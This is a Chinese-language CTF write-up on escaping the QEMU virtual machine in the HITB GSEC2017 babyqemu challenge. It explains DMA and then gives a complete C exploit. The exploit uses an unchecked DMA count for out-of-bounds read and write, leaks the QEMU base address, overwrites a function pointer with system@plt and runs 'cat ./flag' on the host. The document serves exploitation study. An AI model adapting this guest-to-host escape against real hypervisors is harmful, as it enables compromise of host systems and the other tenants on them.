# QEMU逃逸  --  dma

> `DMA(Direct Memory Access)`：直接内存访问

## 0x00 DMA

`DMA(Direct Memory Access)`：直接内存访问

有两种方式引发数据传输：

第一种情况：软件对数据的请求

- 当进程调用`read`，驱动程序函数分配一个`DMA`缓冲区，并让硬件将数据传输到这个缓冲区中，进程处于睡眠状态；

- 硬件将数据写入到`DMA`缓冲区中，当写入完毕，产生一个中断

- 中断处理程序获取输入的数据，应答中断，并唤起进程，该进程现在即可读取数据

  第二种情况：在异步使用`DMA`时

- 硬件产生中断，宣告新数据的到来

- 中断处理程序分配一个缓冲区，并且告诉硬件向哪里传输数据

- 外围设备将数据写入数据区，完成后，产生另外一个中断

- 处理程序分发数据，唤醒任何相关进程，然后执行清理工作

DMA控制器必须有以下功能：

1、 能向CPU发出系统保持(HOLD)信号，提出总线接管请求；

2、 当CPU发出允许接管信号后，负责对总线的控制，进入DMA方式；

3、 能对存储器寻址及能修改地址指针，实现对内存的读写操作；

4、 能决定本次DMA传送的字节数，判断DMA传送是否结束；

5、 发出DMA结束信号，使CPU恢复正常工作状态。

**注意：**当虚拟机通过`DMA（Direct Memory Access）`访问大块`I/O`时，`QEMU`模拟程序将不会把结果放进共享页中，而是通过内存映射的方式将结果直接写到虚拟机的内存中，然后通知`KVM`模块告诉客户机`DMA`操作已经完成。

## 0x01 HITB GSEC2017 babyqemu

DMA存在越界读和越界写

> 本质上是完全没有检查dma.cnt的数字

泄露qemu_elf_base，寻找system的plt表地址，填入“cat flag”字符串

## 0x02 exploit

````c
#include<stdint.h>
#include<fcntl.h>
#include<sys/mman.h>
#include<sys/io.h>
#include<stdio.h>
#include<unistd.h>

unsigned char* mmio_mem;
uint64_t phy_userbuf;
char *userbuf;

void Err(char * err){
    printf("[*] Error: %s\n",err);
    exit(-1);
}

void init_mmio(){
    int mmio_fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0",O_RDWR|O_SYNC);
    mmio_mem = mmap(0,0x1000,PROT_READ|PROT_WRITE,MAP_SHARED,mmio_fd,0);
}

void mmio_write(uint32_t addr,uint32_t value){
    *(uint32_t*)(mmio_mem+addr) = value;
}

uint64_t mmio_read(uint64_t addr){
    return *(uint64_t*)(mmio_mem+addr); 
}

size_t va2pa(void *addr){
    uint64_t data;

    int fd = open("/proc/self/pagemap",O_RDONLY);
    if(!fd){
        perror("open pagemap");
        return 0;
    }

    size_t pagesize = getpagesize();
    size_t offset = ((uintptr_t)addr / pagesize) * sizeof(uint64_t);

    if(lseek(fd,offset,SEEK_SET) < 0){
        puts("lseek");
        close(fd);
        return 0;
    }

    if(read(fd,&data,8) != 8){
        puts("read");
        close(fd);
        return 0;
    }

    if(!(data & (((uint64_t)1 << 63)))){
        puts("page");
        close(fd);
        return 0;
    }

    size_t pageframenum = data & ((1ull << 55) - 1);
    size_t phyaddr = pageframenum * pagesize + (uintptr_t)addr % pagesize;

    close(fd);

    return phyaddr;
}

uint64_t dma_get_src(){
    return mmio_read(0x80);
}

uint64_t dma_get_dst(){
    return mmio_read(0x88);
}

uint64_t dma_get_cnt(){
    return mmio_read(0x90);
}

uint64_t dma_get_cmd(){
    return mmio_read(0x98);
}

void dma_set_src(uint32_t value){
    mmio_write(0x80,value);
}

void dma_set_dst(uint32_t value){
    mmio_write(0x88,value);
}

void dma_set_cnt(uint32_t value){
    mmio_write(0x90,value);
}

void dma_set_cmd(uint32_t value){ // timer
    mmio_write(0x98,value);
}

void dma_do_write(uint32_t addr, void* buf, size_t len){
    memcpy(userbuf, buf, len);

    dma_set_src(phy_userbuf);
    dma_set_dst(addr);
    dma_set_cnt(len);

    dma_set_cmd(1);
    sleep(1);
}

void dma_do_enc(uint32_t addr, size_t len){
    dma_set_src(addr);
    dma_set_cnt(len);

    dma_set_cmd(7);
}


int main(){
    init_mmio();
    puts("[*] init mmio");
    printf("[*] mmio_mem ==> 0x%llx\n",mmio_mem);

    userbuf = mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    memset(userbuf,0,0x1000);
    phy_userbuf = va2pa(userbuf);
    printf("[*] userbuf ==> 0x%llx\n",userbuf);
    printf("[*] phy_userbuf ==> 0x%llx\n",phy_userbuf);

    puts("[*] leak addr");
    dma_set_src(0x40000+0x1000);
    dma_set_dst(phy_userbuf);
    dma_set_cnt(0x8);
    dma_set_cmd(0x3);
    sleep(1);

    size_t enc_addr = *(size_t*)userbuf;
    printf("[*] enc_addr ==> 0x%llx\n",enc_addr);
    size_t qemu_base = enc_addr-0x283dd0;
    printf("[*] qemu_base ==> 0x%llx\n",qemu_base);
    size_t system_plt = qemu_base+0x1FDB18;
    printf("[*] system_plt ==> 0x%llx\n",system_plt);

    puts("[*] edit enc ==> system@plt");
    dma_do_write(0x40000+0x1000, &system_plt, 0x8);

    puts("[*] set 'cat flag' ");
    char* catflag = "cat ./flag\x00\x00";
    dma_do_write(0x200+0x40000, catflag, 12);
    // pause();
    puts("[*] enc 'cat flag' ");
    dma_do_enc(0x200+0x40000, 8);

    return 0;
}
````

